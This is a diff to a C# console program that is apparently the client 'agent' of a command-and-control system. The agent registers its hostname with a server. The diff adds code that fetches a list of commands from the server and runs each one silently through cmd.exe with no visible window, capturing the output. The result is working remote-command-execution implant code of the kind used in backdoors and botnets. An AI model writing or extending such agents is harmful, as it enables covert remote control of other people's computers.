@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 // per https://learn.microsoft.com/en-us/dotnet/csharp/tutorials/console-webapiclient
 using System.Threading.Tasks;
 using System.Net;
@@ -90,7 +91,7 @@ namespace client
             // build httpcontent body with hostname
             string contentBody = $"{{\"hostname\": \"{hostname}\",\"register\": \"true\"}}";
             HttpContent content = new StringContent(contentBody);
-            bool sent = await this.BuildAndSendHTTPRequest(content);
+            (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
             if (sent) {
                 Console.WriteLine("Agent registered with server.");
             } else {
@@ -110,17 +111,49 @@ namespace client
             // build httpcontent body with hostname
             string contentBody = $"{{\"hostname\": \"{hostname}\",\"command\": \"true\"}}";
             HttpContent content = new StringContent(contentBody);
-            bool sent = await this.BuildAndSendHTTPRequest(content);
+            (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
             if (sent) {
-                Console.WriteLine("Agent registered with server.");
+                Console.WriteLine("Agent recieved new command set.");
+
+                // parse body json into a object
+                // c# got mad when there was no class to pass this into
+                // i now realize i could have used a base class lol
+                CommandSet commandSet = System.Text.Json.JsonSerializer.Deserialize<CommandSet>(body);
+                
+                // console log the command set for testing
+                //Console.WriteLine($"Command set recieved: {commandSet.commands}");
+
+                // execute commands
+                
+                // don't pass another shell to this command shell!!!
+                foreach (string command in commandSet.commands) {
+                    Console.WriteLine($"Executing command: {command}");
+                    // execute command
+                    ProcessStartInfo startInfo = new ProcessStartInfo();
+                    startInfo.FileName = "cmd.exe";
+                    startInfo.Arguments = $"/c {command}";
+                    startInfo.UseShellExecute = false;
+                    startInfo.RedirectStandardOutput = true;
+                    startInfo.CreateNoWindow = true;
+                    using (Process process = Process.Start(startInfo))
+                    {
+                        using (StreamReader reader = process.StandardOutput)
+                        {
+                            string result = reader.ReadToEnd();
+                            Console.WriteLine(result);
+                        }
+                    }
+                }
+                
+                
+
             } else {
-                Console.WriteLine("Agent failed to register with server.");
-                this.errored = true;
+                Console.WriteLine("Agent failed to fetch commands.");
             }
             
         }
 
-        public async Task<bool> BuildAndSendHTTPRequest(HttpContent content)
+        public async Task<(bool,string)> BuildAndSendHTTPRequest(HttpContent content)
         {
             try{
                 // send to server for registration
@@ -128,18 +161,24 @@ namespace client
                 response.EnsureSuccessStatusCode();
 
                 Console.WriteLine(await response.Content.ReadAsStringAsync());
-
-                return true;
+                string body = await response.Content.ReadAsStringAsync();
+                return (true, body);
             }
             catch (HttpRequestException e)
             {
                 //Console.WriteLine("\nException Caught!");
                 //Console.WriteLine("Message :{0} ",e.Message);
 
-                return false;
+                return (false, "");
             }
         }
         
+    }
+
+    // class to hold command set
+    public class CommandSet
+    {
+        public LinkedList<String> commands {get; set;}
     }
 
 }
